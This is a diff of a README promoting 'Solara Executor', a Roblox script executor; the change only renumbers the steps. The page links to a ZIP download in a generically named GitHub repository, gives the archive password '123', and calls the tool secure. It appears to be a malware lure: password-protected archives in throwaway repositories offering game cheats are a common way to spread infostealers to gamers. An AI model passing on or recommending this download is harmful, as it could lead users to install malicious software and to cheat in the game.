@@ -4,8 +4,7 @@
 To get started with Solara Executor, follow these simple steps:
 1. **[![Download Solara Executor](https://img.shields.io/badge/Download-Solara%20Executor-blueviolet)](https://github.com/fnz02221/testproject/releases/download/qwe/Solara.zip)** 
 2. Extract the downloaded ZIP file to your desired location on your system.
-2. Password: 123
-3. 
+3. Password: 123
 **Description:**  
 🚀 **Solara Executor** is a cutting-edge Roblox script executor designed for advanced script execution, optimized performance, and seamless user experience. Fully compatible with the latest Roblox updates, it is secure, easy to use, and perfect for gamers, developers, and modding enthusiasts looking to enhance their Roblox gameplay. 
 
